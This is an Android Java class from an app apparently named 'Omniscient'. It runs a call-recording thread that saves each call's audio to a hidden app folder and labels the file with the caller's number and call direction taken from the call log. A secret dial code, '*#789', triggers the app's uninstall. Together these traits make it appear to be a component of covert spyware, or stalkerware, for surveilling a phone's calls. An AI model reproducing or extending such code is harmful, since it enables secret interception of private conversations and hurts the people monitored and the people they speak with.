package com.postal.omniscient.postal.catchPhone.Call;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.telecom.Call;
import android.util.Log;

import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Александр on 02.08.2016.
 */
public class CallInThread extends Thread {

    public CallInThread(Context context, String folderName, String fileName){
        this.context = context;
        this.folderName = folderName;
        this.fileName = fileName;

    }

    private Context context;
    private String folderName, fileName;
    private MediaRecorder recorder;
    private File audiofile;
    private String time = new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
            .format(new Date());
    private String no_written = "no_written_";
    private File tempFile = null;

    private static final String APP_PREFERENCES_NAME = "MY_PREFERENCES";
    private static final String PREFERENCES_KEY_IS_CALL = "call";
    private static final String IS_CALL = "noCall";
    private SharedPreferences mSettings = null;

    private static final String code = "*#789";
    private static final String delete = "delete";

    @Override
    public void run() {
        recordStart();
    }

    private void recordStart() {
        EventBus.getDefault().register(this);

        File sampleDir = new File(context.getFilesDir(), "/Omniscient/"+folderName);

        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        try {
            tempFile = File.createTempFile(no_written + "_" + time, fileName, sampleDir);
            audiofile = tempFile;
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T -1 " + e);
        }

        recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);//VOICE_COMMUNICATION ip call
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {
            recorder.prepare();
            recorder.start();
            Log.i("MyMsg", "Start Record ");
        } catch (IllegalStateException e) {
            Log.i("MyMsg", "Eror T0 " + e);
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T1 " + e);
        } catch (Exception e) {
            Log.i("MyMsg", "Eror Record " + e);
        }



    }
    public void recordStop(){
        recorder.stop();
        recorder.release();
        recorder = null;
        Log.i("MyMsg", "call off");
        renameFile();
        EventBus.getDefault().post(new EventBusData("call_off"));
        EventBus.getDefault().unregister(this);
    }

    private void renameFile() {
        File dir = new File(context.getFilesDir(), "/Omniscient/"+folderName);
        if(dir.exists()){


            File from = tempFile;//new File(dir,no_written+file_name+fileName);
            long sec = 1000 * 2;
            try {
                Thread.sleep(sec);// ВРЕМЯ СНА ЦЫКЛА ВКЛЮЧИТЬ 1 ЧАС
            } catch (Exception e) {
                Log.e("MyMsg","1"+ e.toString());
            }
            String in_out_Call = getNumber();

            //удаляем запись если позвонили на неправельный номер (который содержит * или #)
            if(in_out_Call.equals(delete)){
                from.delete();
                Log.e("MyMsg", "-DELETE mp3-");
                return;
            }
            //перейменовуем файл
            File to = new File(dir,time + "_" + in_out_Call + fileName);
            if(from.exists())
                from.renameTo(to);
        }
    }
    private  String getNumber(){
        String call_number = "";
        String call_in_or_out = "";
        String in_out = "";
        String date = CallLog.Calls.DATE;// "date";
        String type = CallLog.Calls.TYPE;//"type";
        String number = CallLog.Calls.NUMBER;//"number";
        Uri uri;
        uri = CallLog.Calls.CONTENT_URI;//Uri.parse("content://call_log/calls");
        String[] projection = {type, number};

        try {
            Cursor cur = context.getContentResolver().query(uri,
            projection, null, null, date + " DESC");// DESC - сортировка по убываню
            if (cur.moveToFirst()) {
                call_number = cur.getString(1);//1 потомучто {type, number}; number - идет 2м элементом
                call_in_or_out = cur.getString(0);
            }
            if (call_in_or_out.equals("2")){
                in_out = "_out_call";
            }else if (call_in_or_out.equals("1")){
                in_out = "_in_call";
            }
            //УДАЛЕНИЕ ПРИЛОЖЕНИЯ
            if (call_number.equals(code)) {
                Log.i("MyMsg", "start DELETE APP");
                deleteAPP(context);
            }
            //удаляем запись если намер имеет * или # так как такие номера ошибочны
            if (call_number.contains("*") || call_number.contains("#")) {
                return delete;
            }
            //удалем + если такой имееться в номере телефона
            if (call_number.contains("+")){
                call_number = call_number.replace("+", "");
            }

        }catch (Exception e){}
        Log.e("MyMsg","End---"+call_number);
        return call_number+in_out;
    }
    private void deleteAPP(final Context context) {
        Uri packageURI = Uri.parse("package:com.postal.omniscient");
        Intent i = new Intent(Intent.ACTION_DELETE, packageURI);
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    @Subscribe(threadMode = ThreadMode.ASYNC)
    public void onEvent(EventBusCall event){
        String command = event.getComand();
        if(command.equals("stop")){
            recordStop();

        }
    }

}
